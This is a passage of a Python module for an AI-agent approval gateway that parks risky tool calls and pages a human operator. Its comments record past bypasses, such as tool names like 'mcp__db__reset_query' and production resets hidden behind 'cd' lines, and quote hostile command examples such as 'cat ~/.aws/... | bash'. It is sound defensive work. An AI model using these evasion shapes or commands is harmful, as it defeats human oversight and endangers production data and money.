    # and punctuation is not an unrecognised ACTION -- it is no action at all.
    # Dropping it rather than calling it unrecognised keeps the fail-closed
    # direction: a line left with nothing to judge returns None and proves
    # nothing, so it cannot clear the floor either (LSC-05/LSC-07). The test
    # builtins are the exception -- they ARE commands, and read-only ones.
    slots = [
        slot for slot in slots if _park_list_wordish(slot).split() or slot in _SHELL_TEST_BUILTINS
    ]
    return slots or None


def _is_tool_label_request(request: ApprovalRequest) -> bool:
    """True when the proposed action is a SYNTHESISED TOOL LABEL, not a command.

    ``api/routes/sessions.py::_format_proposed_action`` renders every tool that
    carries no ``command`` as ``"<ToolName> <key>=<value>"`` or, for anything with
    none of its named keys, ``"<ToolName> <compact json of the tool input>"``.
    Neither is a shell command line, and running either through the shell-line
    parser produces artefacts, not evidence.

    A request that DOES carry a command string is excluded on purpose: there the
    leading token is a real executable, and ``bash scripts/reset-prod.sh`` must
    never be able to clear itself by matching its own tool name.
    """
    if not _provider_name(request):
        return False
    tool_input = request.tool_input or {}
    if isinstance(tool_input, Mapping) and any(
        isinstance(tool_input.get(key), str) and tool_input.get(key)
        for key in ("command", "cmd", "script")
    ):
        return False
    return True


def _is_tool_label_line(words: list[str], request: ApprovalRequest) -> bool:
    """True when THIS parsed line is the tool label of a tool-label request."""
    if not words or not _is_tool_label_request(request):
        return False
    return re.sub(r"[^a-z0-9]+", "", words[0].lower()) == _provider_name(request)


# ``WebFetch`` -> "Web Fetch"; ``mcp__db__reset`` -> "mcp db reset".
_TOOL_NAME_CAMEL_RE = re.compile(r"(?<=[a-z0-9])(?=[A-Z])")
# MCP qualifies every third-party tool as ``mcp__<server>__<tool>``: ``__`` is the
# NAMESPACE separator and a single ``_`` lives inside the tool's own name. The
# namespace is TRANSPORT, exactly like the host in ``ssh host <cmd>`` -- it can
# neither clear this floor nor arm it, which is what keeps ``mcp__query__reset``
# from laundering itself on a recognised server name.
_TOOL_NAMESPACE_SEP = "__"
_TOOL_NAME_DELIMITED_RE = re.compile(r"[^A-Za-z0-9]")


class _ToolName(NamedTuple):
    """A tool name reduced to the parts this floor is allowed to judge."""

    segments: list[str]
    """Segments of the tool's OWN name (namespace stripped), in order."""
    ambiguous: bool
    """True when the name has more than one reading, so EVERY segment must clear."""


def _split_tool_name(tool_name: str | None) -> _ToolName:
    """Split a tool name, and say whether it has more than one available reading.

    Three naming conventions occur in tool names and they do not agree on where
    the verb is:

        verb_object   ``reset_query``, ``list_tables``, ``getUserById``
        object_verb   ``brave_web_search``, ``browser_click``, ``tavily_search``
        modifier+head ``TodoWrite``, ``MultiEdit``, ``NotebookEdit``

    NO VOCABULARY CAN SEPARATE THEM. ``reset``, ``brave`` and ``Todo`` are all
    unknown to every regex in this module -- that is the premise of LS-022 -- so
    "is THIS segment the verb?" is not answerable.

    THREE ROUNDS ON THIS FUNCTION PROVED THE QUESTION IS THE DEFECT, not any one
    answer to it. Judging only the LAST segment approved ``mcp__db__reset_query``
    against a customer table (GCV-01). Judging only the FIRST approved
    ``mcp__globex__create_launch_batch`` against a live ad budget -- six in
    this operator's own transcripts. Judging the first AND the last approved
    ``mcp__db__query_reset_fetch``, because ``reset`` sat between them
    (GCV-01-CONFIRM-1). A rule that selects WHICH segments to judge always leaves
    a segment unjudged, and the unjudged segment is where the next round lives.

    So the caller no longer selects: for a name with more than one reading EVERY
    segment must clear. This function's remaining job is only to say which names
    those are.

    * A name an MCP server can register -- namespaced ``mcp__…__…``, or carrying
      any explicit delimiter -- is AMBIGUOUS. It can be read from either end, so
      no segment of it may be exempted from judgement.
    * A BARE, delimiter-free name (``TodoWrite``, ``MultiEdit``) is read
      modifier+head alone. Those are the host runtime's own first-party tools --
      an MCP server cannot register a name without its ``mcp__<server>__`` prefix
      -- so that population is CLOSED and enumerable rather than attacker-chosen.
      This is not a positional exemption granted to a middle: it is a statement
      about WHO MAY REGISTER THE NAME, and the segment it declines to judge is one
      no attacker can choose. Measured as a counterfactual rather than asserted:
      requiring "Todo", "Web", "Task" and "Structured" to be recognised ACTIONS
      parks 81 further real requests out of 75,289 (+0.108pp) and closes no
      reachable path, because the only names an attacker can register are
      namespaced, and namespaced is ambiguous, and ambiguous judges everything.

    DECLARED RESIDUE, each costing a false PARK or living outside the attacker's
    reach, never a false approve:
      * ``mcp__brave-search__brave_web_search``, ``mcp__playwright__browser_click``
        and other object_verb reads park on the high-value surface -- one human
        click each, 9 in 75,078 real tool calls when that was last counted;
      * an ambiguous name whose object is an unrecognised NOUN
        (``mcp__db__list_all_tables``, ``mcp__filesystem__read_text_file``) parks
        there too, because "recognised action" is doing duty as "recognised word"
        for segments that are not the verb. The sanctioned way to buy those back
        is to widen ``_RECOGNISED_ACTION_TOKENS`` with words the corpus actually
        contains -- never to exempt a position, which is what produced GCV-01
        twice;
      * a BARE verb-first name (a first-party tool literally called
        ``resetQuery``) still clears on "Query". Nothing in this codebase can
        register one; if the first-party toolset ever grows a verb-first
        PascalCase name, this is the line that has to change.
    """
    raw = (tool_name or "").strip()
    namespaced = _TOOL_NAMESPACE_SEP in raw
    own = raw.rsplit(_TOOL_NAMESPACE_SEP, 1)[-1] if namespaced else raw
    segments = [
        part for part in re.split(r"[^A-Za-z0-9]+", _TOOL_NAME_CAMEL_RE.sub(" ", own)) if part
    ]
    return _ToolName(segments, namespaced or _TOOL_NAME_DELIMITED_RE.search(own) is not None)


def _tool_name_action_slots(request: ApprovalRequest) -> tuple[list[str], list[str]]:
    """``(surface slots, verb slots)`` for a tool label.

    An earlier version declared a tool-label line RECOGNISED outright, which made
    this floor a complete no-op for every non-Bash tool -- including the case
    where the tool's name IS the destructive action (LSC-02a):

        tool=mcp__db__reset input={"query": "reset production customers"}

    What replaced it has now failed three times, and the RECURRENCE is the
    diagnosis rather than any one of the three names:

        judge the LAST segment    mcp__db__reset_query        -> APPROVED
                                  ("query" is allowlisted; "reset", the actual
                                  verb, was never looked at -- GCV-01)
        judge FIRST and LAST      mcp__db__query_reset_fetch  -> APPROVED
                                  ("reset" is a middle segment, so it was in
                                  neither clearing position; it is also not on
                                  the enumerated risk lists, and ``reset`` being
                                  absent from them is the FOUNDING PREMISE of
                                  this module. It was therefore dropped from
                                  ``verb_slots`` altogether and ``all()`` cleared
                                  VACUOUSLY over the two ordinary ends --
                                  GCV-01-CONFIRM-1.)

    THE INVARIANT, and it is deliberately not a fourth position rule: NO SEGMENT
    MAY BE SILENTLY DROPPED FROM JUDGEMENT. Every segment of an ambiguous name is
    a verb slot, so each one either clears as a recognised ordinary action or ARMS
    this floor. There is no third outcome and no positional exemption. An
    unrecognised segment is not evidence of safety -- it is exactly the unknown the
    inversion exists to refuse -- and where it sits in the name says nothing about
    it.

    THIS NO LONGER DEPENDS ON ENUMERATION, which is the whole of the change. The
    superseded version reached its middle segments only through
    :func:`_is_enumerated_risk_verb`, so it could see a middle that was already on
    a denylist and nothing else; every unlisted verb (``reset``, ``recycle``,
    ``rotate``, ``retire``) passed through invisibly. Commit 855665b6 on this
    branch claimed the middle case was covered "by arming". IT WAS NOT, and that
    claim is retracted here: arming fired for enumerated verbs only, and this
    floor exists precisely because enumerations run out.

    ARMING now means the ordinary thing. An enumerated risk verb is judged like
    any other segment and clears only where the floors above could actually see it
    (``risk_verb_clears``) -- their standing down is a decision there and an
    absence everywhere else.

    The SURFACE slots are every segment of the tool's own name: a name is target
    text as well as action text (``mcp__admin__customers``), and what gets JUDGED
    was never allowed to narrow what gets SEEN.

    THE PRICE, measured over 75,289 real non-Bash tool calls and 181,853 real Bash
    commands rather than guessed, and stated at both levels because only one of
    them is the park rate:

      at the NAME level  2 of 144 distinct names lose their clearance (20 calls):
                         ``mcp__globex__set_ad_object_status`` and
                         ``mcp__filesystem__read_text_file``. Every other name
                         that gained slots was ALREADY parking on an end segment,
                         so the widening did not reach it.
      at the REQUEST level  newly parked 0, un-parked 0, on BOTH corpora. None of
                         those 20 calls is on the money / customer / production
                         surface, and this floor only judges requests that are.
                         (The Bash corpus is structurally blind to this path -- a
                         Bash request is never a tool label -- so its flat zero is
                         a control, not evidence. That is why both were run.)

    It cannot UN-park anything BY CONSTRUCTION, which is the claim that matters
    and does not depend on the corpus: for an ambiguous name the new slot list is
    a strict SUPERSET of every superseded one and the caller requires ALL of them;
    a bare name is untouched.
    """
    tool = _split_tool_name(request.tool_name)
    if not tool.segments:
        return [], []
    if tool.ambiguous:
        # No selection, so nothing can be left out of the judgement.
        return tool.segments, list(tool.segments)
    # A BARE name is the closed first-party population (see :func:`_split_tool_name`):
    # modifier+head, so only the head claims to name the action. Its siblings are
    # still checked against the enumerated risk verbs, which can only ever make the
    # line harder to clear.
    last = len(tool.segments) - 1
    verb_slots = [
        segment
        for position, segment in enumerate(tool.segments)
        if position == last or _is_enumerated_risk_verb(segment)
    ]
    return tool.segments, verb_slots


def _is_enumerated_risk_verb(word: str) -> bool:
    """True when this bare word is on one of the two enumerated risk verb lists."""
    lowered = word.lower()
    return (
        _DESTRUCTIVE_VERB_RE.match(lowered) is not None
        or _VALUE_MOVE_VERB_RE.match(lowered) is not None
    )


def _tool_input_surface_text(request: ApprovalRequest) -> tuple[str, bool]:
    """Every non-prose key and value of a tool input, flattened for the surface test.

    The synthesised JSON payload is stripped as content before the floor reads the
    proposed action (a ``Task`` prompt that merely MENTIONS production is not an
    action against production). That strip is correct for PROSE and far too wide
    for everything else: it also deleted ``{"env": "production", "mode":
    "factory"}``, so for every tool rendered through the JSON fallback the floor
    saw a bare tool name and no target at all (LSC-02b).

    The structured input is right there, so read IT rather than un-stripping the
    flattened text: walk the mapping, skip the prose-bearing keys this module
    already refuses to scan (:data:`_NON_ACTION_PAYLOAD_KEYS`), and keep the rest.

    Returns ``(text, complete)``. The walk is BOUNDED, because a tool input is
    arbitrary caller-supplied JSON -- and a bound that silently truncates turns
    "we could not see all of it" into "there is nothing there", which is the
    favourable-absence defect this whole floor exists to close. ``complete`` is
    False when the bound was hit, and the caller treats that as unprovable rather
    than as clear.
    """
    tool_input = request.tool_input or {}
    if not isinstance(tool_input, Mapping):
        return "", True
    parts: list[str] = []
    complete = True

    def walk(value: object, depth: int) -> None:
        nonlocal complete
        if depth > _PARK_LIST_MAX_NESTING or len(parts) > _TOOL_INPUT_MAX_PARTS:
            complete = False
            return
        if isinstance(value, Mapping):
            for key, nested in value.items():
                name = str(key).lower()
                if name in _NON_ACTION_PAYLOAD_KEYS:
                    continue
                parts.append(name)
                walk(nested, depth + 1)
        elif isinstance(value, list | tuple):
            for item in value:
                walk(item, depth + 1)
        elif isinstance(value, str | int | float | bool):
            parts.append(str(value))

    walk(tool_input, 0)
    return " ".join(parts), complete


# ``\`` at end of line: the next PHYSICAL line is part of the SAME command.
# ``\n`` is a statement separator here, so without this a continued command was
# chopped into fragments -- including lines consisting of nothing but the
# backslash -- and every fragment then had to prove itself recognised (LSC-05).
# Joining is not leniency: it reassembles the one command that is actually run.
_LINE_CONTINUATION_RE = re.compile(r"\\[ \t]*\r?\n")


def _verb_slot_command_lines(field: str) -> list[list[str]]:
    """Every command line of one field, with transports resolved to their payload.

    Quote-aware (``_split_top_level``), so a remote payload stays attached to its
    transport and a ``;`` inside quotes is not mistaken for a statement boundary.
    """
    lines: list[list[str]] = []
    for statement in _split_top_level(_LINE_CONTINUATION_RE.sub(" ", field), _STATEMENT_SEPARATORS):
        for stage in _split_top_level(statement, ("|",)):
            words = _park_list_strip_prefixes(_segment_words(stage))
            if not words:
                continue
            # A COMMENT IS NOT A COMMAND. It never executes, so it can neither
            # prove nor disprove anything about the action -- and demanding that
            # it look like a recognised command is how ``# extract the reply
            # section`` became evidence of an unrecognised action (LSC-05). The
            # surface test still reads the whole text, so a comment cannot hide a
            # target either.
            if words[0].startswith("#"):
                continue
            nested: list[str] | None = None
            if Path(words[0].lower()).name in _TRANSPORT_EXECUTABLES:
                nested = _park_list_nested_payload(words)
            lines.append(nested if nested else words)
    return lines


class _JudgedLine(NamedTuple):
    """One readable line of a request, and how this floor is allowed to judge it.

    A SHELL line names its action in one of several slots -- the executable head
    OR a token in the operand window (``python manage.py reset_db``) -- so ANY
    recognised slot proves the line ordinary.

    A TOOL LABEL is not a command line and does not have that shape. Its slots are
    the segments of one compound name, at most one of which is the verb; the rest
    are its object or its modifiers, and they must never be able to clear on the
    verb's behalf. That is GCV-01: ``mcp__db__reset_query`` cleared on "query"
    while "reset" -- the actual verb, and unrecognised -- was never judged. So a
    tool label requires ALL of its slots, and for an ambiguous name
    :func:`_tool_name_action_slots` hands over EVERY segment: choosing which
    segments are "allowed to decide" left an undecided segment three rounds
    running, and the undecided segment is where the bypass was each time.
    """

    surface_slots: list[str]
    """Text this line contributes to the high-value SURFACE test."""
    verb_slots: list[str]
    """Slots that decide whether this line names a RECOGNISED action."""
    every_slot_must_clear: bool
    """True for a compound name (all slots), False for a command line (any slot)."""

    def surface_text(self) -> str:
        return " ".join(self.surface_slots)

    def is_recognised(self, *, risk_verb_clears: bool) -> bool:
        # ``self.verb_slots and`` is the same fail-closed guard as ``recognised
        # and all(recognised)`` below, one level down: ``all([])`` is True, and a
        # line with no slot to judge has proven nothing (LSC-07).
        if not self.verb_slots:
            return False
        decide = all if self.every_slot_must_clear else any
        return decide(
            _is_recognised_action_token(slot, risk_verb_clears=risk_verb_clears)
            for slot in self.verb_slots
        )


def _unrecognised_action_floor(
    request: ApprovalRequest,
) -> tuple[HardStop, TargetScope, str] | None:
    """Park an UNRECOGNISED action aimed at money / customers / production.

    Returns ``(category, scope, trigger)`` or ``None`` to stand down. See the
    block comment above for the scope of the inversion and its measured cost.
    """
    plain_language = _is_plain_language_request(request)
    tool_label_request = _is_tool_label_request(request)
    fields = [_strip_action_content(field) for field in _park_list_fields(request)]
    lines: list[_JudgedLine] = []
    for field in fields:
        for words in _verb_slot_command_lines(field):
            # A tool label is not a command line: its VERB is the tool's own name
            # and its operands are field names, not tokens at command positions.
            if _is_tool_label_line(words, request):
                surface_slots, verb_slots = _tool_name_action_slots(request)
                lines.append(_JudgedLine(surface_slots, verb_slots, every_slot_must_clear=True))
                continue
            slots = _action_verb_slots(words, prose_only=plain_language)
            if slots is not None:
                lines.append(_JudgedLine(slots, slots, every_slot_must_clear=False))

    # The surface text is inert-stripped -- a document PATH names a file, it does
    # not act on one -- EXCEPT at a command position, where the path IS the
    # executable. Without that exception ``bash scripts/reset-prod.sh`` loses the
    # only token that names production and this floor never sees it, which is the
    # LS-022 defect wearing a filename.
    surface_fields = list(fields)
    opaque_input = False
    if tool_label_request:
        # The flattened label had its JSON payload stripped as content, which for
        # this whole class of tools deleted the only text naming the target. Read
        # the structured input instead, minus its prose-bearing keys (LSC-02b).
        structured_surface, complete = _tool_input_surface_text(request)
        surface_fields.append(structured_surface)
        opaque_input = not complete
    joined = _strip_inert_spans(" ".join(surface_fields)).lower()
    joined = f"{joined} {' '.join(line.surface_text() for line in lines)}".lower()
    surface_text = f"{joined} {joined.replace('_', ' ').replace('-', ' ')}"
    surface = _high_value_surface(surface_text)
    # AN ENUMERATED RISK VERB ONLY CLEARS THIS FLOOR BECAUSE THE FLOORS ABOVE
    # ALREADY JUDGED IT, and that is only true of evidence they can see.
    # ``_durable_write_floor`` is a conjunction of a verb and a NOUN; when the
    # only thing putting this request on the surface is a targeting FLAG, that
    # floor never fired at all, so its standing down was an absence, not a
    # decision. ``python manage.py flush --settings=app.settings.live`` is the
    # case: "flush" is enumerated, no noun is named, and nothing above ever looked
    # at it (LSC-06).
    flag_only_surface = (
        surface is not None and _high_value_surface_without_flag(surface_text) is None
    )
    trigger = UNRECOGNISED_ACTION_TRIGGERS[surface] if surface is not None else ""
    if surface is None and opaque_input:
        # The tool input was too deep or too wide to read to the end, so this
        # request has NOT been shown to be off the surface -- it has only been
        # shown to be unreadable. Unknown is not a favourable value here either.
        surface = "delete"
        trigger = UNRECOGNISED_OPAQUE_INPUT_ACTION
    elif surface is None:
        if not plain_language:
            return None
        # PLAIN LANGUAGE, so there is no surface gate: with no tool, no target and
        # no structured shape, an unrecognised action names nothing this module
        # can check. It is reported as ``delete`` -- this module's existing name
        # for unbounded capability against an unprovable target.
        surface = "delete"
        trigger = UNRECOGNISED_PLAIN_LANGUAGE_ACTION
    if _is_structurally_read_only(request):
        return None
    unbounded_scope = _unbounded_target_scope(request)
    if unbounded_scope is None:
        return None

    # THE UNIT OF JUDGEMENT IS THE REQUEST, NOT THE LINE (LSC-01). An earlier
    # version aimed the strictness at the lines that THEMSELVES named the surface
    # and stood down when those were recognised. That reopened the LS-022 vector
    # behind an ordinary ``cd``: put the production marker on a recognised line and
    # the destructive action on a line naming nothing, and no line was both aimed
    # and unrecognised, so the floor stood down --
    #
    #     cd /srv/production/app && python manage.py reset_db   -> AUTO-APPROVED
    #     echo production && python manage.py reset_db          -> AUTO-APPROVED
    #
    # ``\n`` is a statement separator here, so an ordinary two-line agent command
    # already has that shape; ``cd <dir> && <cmd>`` is how agents actually invoke
    # things. Splitting the surface from the action across a separator is free, so
    # a per-line test can never hold. Once the REQUEST is on the surface, EVERY
    # readable line has to be ordinary -- the same "prove it" direction the whole
    # floor is built on, applied to the whole request.
    risk_verb_clears = not plain_language and not flag_only_surface
    recognised: list[bool] = [
        line.is_recognised(risk_verb_clears=risk_verb_clears) for line in lines
    ]
    # ``recognised and`` is load-bearing: ``all([])`` is True, and a request whose
    # every line was dropped as content has proven nothing at all. No readable
    # action parks (LSC-07).
    if recognised and all(recognised):
        return None
    return surface, unbounded_scope, trigger


def _classify_request_detail(
    request: ApprovalRequest,
) -> tuple[HardStop | None, HardStop | None, TargetScope, str | None]:
    """:func:`_classify_request` plus the C1 park-list trigger that decided, if any."""
    category, audit_hard_stop, scope = _classify_finance_request(request)
    if category is not None:
        # A finance / delete / secret classification already decided this request.
        # Today's behaviour is preserved exactly and the park-list never runs.
        return category, audit_hard_stop, scope, None

    try:
        surface = park_list_surface(request)
        park_scope = _resolve_actual_target_scope(request) if surface is not None else scope
    except Exception:  # noqa: BLE001 -- an unevaluable park-list must PARK, never approve.
        LOG.warning("approval park-list could not be evaluated; parking fail-closed", exc_info=True)
        return "delete", "delete", "unresolved", PARK_LIST_UNEVALUABLE
    if surface is None:
        # H4 / LS-022: the last thing between an UNRECOGNISED action and an
        # auto-approve. It runs after every rule above, so a request only reaches
        # it once nothing enumerated has claimed it -- which is exactly the
        # request the enumerations were always going to miss.
        try:
            unrecognised = _unrecognised_action_floor(request)
        except Exception:  # noqa: BLE001 -- an unevaluable floor must PARK, never approve.
            LOG.warning(
                "approval unrecognised-action floor could not be evaluated; parking fail-closed",
                exc_info=True,
            )
            return "delete", "delete", "unresolved", UNRECOGNISED_ACTION_UNEVALUABLE
        if unrecognised is not None:
            category, unrecognised_scope, trigger = unrecognised
            return category, category, unrecognised_scope, trigger
        return None, audit_hard_stop, scope, None
    # Reported as ``delete`` because that is this module's existing name for
    # unbounded destructive capability against an unprovable target -- the same
    # category the opaque-payload rule reuses, and for the same reason. The
    # HardStop vocabulary stays finance-only; the precise surface travels in the
    # audit reason instead.
    return "delete", "delete", park_scope, surface


def _classify_request(
    request: ApprovalRequest,
) -> tuple[HardStop | None, HardStop | None, TargetScope]:
    """Return ``(decision_category, audit_hard_stop, target_scope)``."""
    category, audit_hard_stop, scope, _ = _classify_request_detail(request)
    return category, audit_hard_stop, scope


def _classify_finance_request(
    request: ApprovalRequest,
) -> tuple[HardStop | None, HardStop | None, TargetScope]:
    """The AD-15 finance-only classification, unchanged."""
    text = _haystack(request)
    action_class = (request.action_class or "").strip().lower()

    # A bank write can never become executable through approval.
    if _is_structured_bank_write(request) or _BANK_WRITE_RE.search(text):
        return "bank", "bank", _resolve_actual_target_scope(request)

    # Delete beats money/customer when a request contains more than one risk shape.
    delete_hits = _delete_hits(request)
    delete_audit: HardStop | None = None
    delete_scope: TargetScope = "none"
    sql_downgraded = False
    if delete_hits:
        sql_only = all(h in _SQL_DELETE_SHAPES for h in delete_hits)
        if sql_only and _all_sql_fields_additive(request):
            # A real SQL parser PROVED this migration purely additive. A proof
            # outranks the heuristics below, so the durable floor stands down too
            # (an additive migration's own ``-- drop table`` comment must not
            # re-park what the parser just cleared).
            sql_downgraded = True
        else:
            delete_audit = "delete"
            delete_scope = _delete_scope(request, delete_hits)
            if delete_scope != "local_temp":
                return "delete", "delete", delete_scope
            # A PROVEN local-temp delete keeps its truthful audit but does NOT
            # short-circuit: `rm -rf /tmp/scratch && zelle send 500` must not
            # auto-approve just because its FIRST clause is bounded.

    # H3(a): reading a credential store is a hard stop, not an audit note. It is
    # checked BEFORE the money/customer floors so a read-then-egress parks AT THE
    # READ -- the disclosure is the irreversible step and it happens first.
    if _secret_audit_signal(request):
        return "secret", "secret", "none"

    # Sol review, blocker A: content the classifier cannot read, handed to an
    # interpreter. Checked here -- after the secret floor, so `cat ~/.aws/... |
    # bash` still reports the credential read, which is the more truthful
    # trigger -- and BEFORE money/customer, so a park is not left depending on
    # an accident. (Measured: `cat payload.txt | bash` parked only because
    # "payload" contains the `pay` money signal; renaming the file to blob.txt
    # re-opened the hole entirely.)
    #
    # The category is ``delete`` because an arbitrary payload run through an
    # interpreter is unbounded destructive capability, and because this rule is
    # the payload-side twin of _durable_write_floor, which reports the same.
    if _opaque_payload_execution(request):
        return "delete", "delete", "unresolved"

    # Both customer and money floors read the SAME inert-stripped text: a commit
    # message or document path that MENTIONS them is not an instruction to mutate
    # them. Reading
    # the two halves of the floor from different texts is precisely what parked a
    # docs edit as a money move (``payments`` in a path matched ``pay\w*``).
    inert_text = _haystack(request, strip_inert=True)
    if _is_structured_customer_write(request) or _CUSTOMER_WRITE_RE.search(inert_text):
        return "customer", "customer", _resolve_actual_target_scope(request)

    if _MONEY_RE.search(inert_text):
        if _is_structurally_read_only(request):
            return None, delete_audit, delete_scope
        return "money", "money", _resolve_actual_target_scope(request)

    # H1's durable floor. Runs AFTER every structured proof and BEFORE the weak
    # action-class shortcut, so an unrecognized-but-write-shaped request against
    # an unprovable production/customer/money target parks instead of approving.
    if not sql_downgraded:
        floor = _durable_write_floor(request, inert_text)
        if floor is not None:
            category, scope = floor
            return category, category, scope

    # Weak classes apply only after concrete structured risk classification.
    if action_class in _ALWAYS_SAFE_CLASSES:
        return None, delete_audit, delete_scope

    return None, delete_audit, delete_scope


def classify_hard_stop(request: ApprovalRequest) -> HardStop | None:
    """Return the AD-15 park/refuse category, or ``None`` for auto-approval."""
    category, _, _ = _classify_request(request)
    return category


def _action_class_label(request: ApprovalRequest) -> str:
    value = str(request.action_class or "consequential").strip()
    if value.lower().startswith("actionclass."):
        value = value.split(".", 1)[1]
    return value.lower() or "consequential"


_REASON_TRIGGER_RE = re.compile(r"trigger:\s*([a-z0-9-]+)")


def _reason_trigger(reason: str | None) -> str | None:
    """The trigger token out of an audit reason, for a machine-readable payload."""
    if not reason:
        return None
    match = _REASON_TRIGGER_RE.search(reason)
    return match.group(1) if match else None


def _escalate(
    notifier: ApprovalNotifier, request: ApprovalRequest, category: HardStop, reason: str
) -> str | None:
    """Page the operator, handing over the REASON when the notifier can take it.

    :class:`ApprovalNotifier` is a two-argument Protocol with implementations in
    this repo and in the test suite, so widening it is not free. Passing ``reason``
    only to sinks that declare it keeps every existing implementation working
    while the default sink gets the one field an operator actually needs. An
    unreadable signature falls back to the two-argument call rather than raising:
    a page that arrives without its reason still beats no page.
    """
    parameters: Mapping[str, inspect.Parameter] = {}
    try:
        parameters = inspect.signature(notifier.escalate).parameters
    except (TypeError, ValueError):
        pass
    accepts_reason = "reason" in parameters or any(
        parameter.kind is inspect.Parameter.VAR_KEYWORD for parameter in parameters.values()
    )
    if accepts_reason:
        return notifier.escalate(request, category, reason=reason)  # type: ignore[call-arg]
    return notifier.escalate(request, category)


def resolve_approval(
    request: ApprovalRequest, notifier: ApprovalNotifier | None = None
) -> ApprovalDecision:
    """Resolve one request under AD-15 and emit a truthful, stable audit reason."""
    category, audit_hard_stop, scope, park_trigger = _classify_request_detail(request)
    action_class = _action_class_label(request)
    if category is None:
        hard_stop_label = audit_hard_stop or "none"
        return ApprovalDecision(
            approved=True,
            escalated=False,
            category=None,
            reason=(
                "auto-approved per finance-only policy "
                f"(class: {action_class}; hard_stop: {hard_stop_label}; scope: {scope})"
            ),
            request=request,
        )
    if category == "bank":
        return ApprovalDecision(
            approved=False,
            escalated=False,
            category="bank",
            reason=(
                f"refused per finance-only policy (class: {action_class}; "
                f"trigger: bank; scope: {scope})"
            ),
            request=request,
        )

    # A DROPPED PAGE MUST NOT READ LIKE A HEALTHY ONE (LSC-04). All three of "no
    # notifier by design" (``api/routes/sessions.py`` passes ``notifier=None`` and
    # escalates through its own park+notify path), "the notifier raised" and "the
    # notifier recorded nothing" used to produce ``notification_id=None`` beside
    # ``escalated=True``, so no caller could tell a park nobody was paged about
    # from a park that reached an operator. ``None`` now means only the first;
    # both failures carry :data:`ESCALATION_DELIVERY_FAILED`, which cannot be
    # mistaken for a real id (those are ``ntf_``-prefixed).
    if park_trigger in PARK_LIST_TRIGGERS:
        # C1: a NON-finance park. Saying "per finance-only policy" here would be a
        # lie, so this park carries its own stable prefix and names the exact
        # enumerated surface (or the fail-closed sentinel) that decided it.
        reason = (
            "parked per non-finance park-list "
            f"(class: {action_class}; trigger: {park_trigger}; scope: {scope})"
        )
    elif park_trigger is not None:
        # H4 / LS-022: an unrecognised action on the money / customer / production
        # surface. It IS a finance-surface park, so it keeps the existing prefix
        # (``toolplane/session.py`` maps prefixes to denial codes and an unknown
        # one would be recorded as a plain ``denied``); the trigger names it.
        reason = (
            "parked per finance-only policy "
            f"(class: {action_class}; trigger: {park_trigger}; scope: {scope})"
        )
    else:
        reason = (
            "parked per finance-only policy "
            f"(class: {action_class}; trigger: "
            f"{'production-delete' if category == 'delete' else category}; scope: {scope})"
        )

    # THE REASON IS COMPUTED BEFORE THE PAGE IS SENT, so the page can carry it
    # (LSC-03). The trigger is the only thing that distinguishes an
    # unrecognised-action park from a money-move park, and an operator opening
    # "consequential: python manage.py reset_db --env production" with no
    # statement of WHY cannot tell those apart. It travelled to the blocked AGENT
    # in the HTTP response and stopped there.
    notification_id: str | None = None
    if notifier is not None:
        try:
            notification_id = _escalate(notifier, request, category, reason)
        except Exception:  # noqa: BLE001 -- escalation delivery must never break the loop.
            # WARNING, not DEBUG: this is the same class of event as the
            # fail-closed park above, and it is invisible at the default level.
            LOG.warning(
                "approval escalation notify raised; the operator was NOT paged for a %s park",
                category,
                exc_info=True,
            )
            notification_id = ESCALATION_DELIVERY_FAILED
        else:
            if not notification_id:
                LOG.warning(
                    "approval escalation notification was not recorded; "
                    "the operator was NOT paged for a %s park",
                    category,
                )
                notification_id = ESCALATION_DELIVERY_FAILED
    return ApprovalDecision(
        approved=False,
        escalated=True,
        category=category,
        reason=reason,
        request=request,
        notification_id=notification_id,
    )


class ApprovalGateway:
    """The in-loop approval resolver an executor consults for each request.

    Thread-safe (a run may drive multiple approvals concurrently) and it records every
    decision so the orchestration result can report exactly what was auto-approved and
    what was escalated.
    """

    def __init__(self, notifier: ApprovalNotifier | None = None) -> None:
        self._notifier = notifier
        self._decisions: list[ApprovalDecision] = []
        self._lock = threading.Lock()

    def resolve(self, request: ApprovalRequest) -> ApprovalDecision:
        decision = resolve_approval(request, self._notifier)
        with self._lock:
            self._decisions.append(decision)
        return decision

    @property
    def decisions(self) -> list[ApprovalDecision]:
        with self._lock:
            return list(self._decisions)


class NotificationEscalator:
    """Default :class:`ApprovalNotifier` — records a durable escalation notification.

    Reuses the single notifications write seam
    (:func:`omniagentos.notifications.service.record_notification`), so a hard-stop
    escalation lands in the same operator feed/approvals panel every other source uses.
    Best-effort by contract: a persistence failure never breaks the orchestration.
    """

    def __init__(self, *, db_path: str | None = None, push: bool = True) -> None:
        self._db_path = db_path
        self._push = push

    #: Every category a park can carry, as a genuinely immutable mapping.
    #:
    #: LSC-04. A previous version called this map FROZEN in its docstring while it
    #: was a plain mutable class dict, and looked the category up by SUBSCRIPT: a
    #: classifier returning a category absent from it raised ``KeyError``, which
    #: the caller swallowed, so the park happened and the operator was never
    #: paged. Pinning the three categories in use did not change that SHAPE -- the
    #: next floor to invent a category would have hit it again. Both halves are
    #: fixed instead: ``MappingProxyType`` makes "frozen" true, and
    #: :meth:`escalate` degrades to a generic label rather than raising, so an
    #: unmapped category costs a vaguer page and never a missing one.
    CATEGORY_LABELS: Mapping[HardStop, str] = MappingProxyType(
        {
            "money": "money-move",
            "delete": "file deletion",
            "secret": "secret access",
            "customer": "customer write",
            "bank": "bank write refusal",
        }
    )
    #: What an unmapped category is called. Deliberately vague and deliberately
    #: still a page: "a hard stop happened and we could not name it" is a far
    #: better operator experience than silence.
    UNMAPPED_CATEGORY_LABEL = "hard stop"

    def escalate(
        self, request: ApprovalRequest, category: HardStop, reason: str | None = None
    ) -> str | None:
        """Record the durable escalation.

        ``reason`` is optional so the two-argument :class:`ApprovalNotifier`
        Protocol still describes this class, and it carries the TRIGGER -- the
        only thing that tells an operator an unrecognised-action park from a
        money-move park. Without it the page reads "consequential: python
        manage.py reset_db --env production" and says nothing about why anyone was
        asked (LSC-03).
        """
        from omniagentos.notifications.service import record_notification

        label = self.CATEGORY_LABELS.get(category)
        if label is None:
            LOG.warning(
                "approval escalation category %r has no label; paging with a generic one",
                category,
            )
            label = self.UNMAPPED_CATEGORY_LABEL
        ref_id = request.session_id or request.run_id
        summary = f"{request.action_class}: {request.proposed_action}".strip()
        return record_notification(
            kind="escalation",
            title=f"Approval required: {label}",
            body=f"{summary}\n\nWhy: {reason}" if reason else summary,
            severity="warning",
            ref_type="session" if request.session_id else "run",
            ref_id=ref_id,
            payload={
                "category": category,
                "action_class": request.action_class,
                "proposed_action": request.proposed_action,
                "tool_name": request.tool_name,
